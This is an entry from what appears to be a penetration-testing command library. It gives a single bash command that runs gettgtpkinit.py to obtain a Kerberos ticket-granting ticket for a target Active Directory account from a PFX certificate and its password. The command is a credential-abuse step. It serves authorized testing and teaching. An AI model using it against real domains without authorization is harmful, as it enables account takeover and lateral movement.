---
id: 38f3d328-3493-42c4-b831-ee743361b075
name: Get TGT using PFX certificate and password
type: command
executor: bash
data: gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME"
  "TGT_CCACHE_FILE"
output: null
created_at: '2023-04-06T03:56:06.176828+00:00'
updated_at: '2023-04-10T20:26:17.485526+00:00'
---

# Get TGT using PFX certificate and password

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```
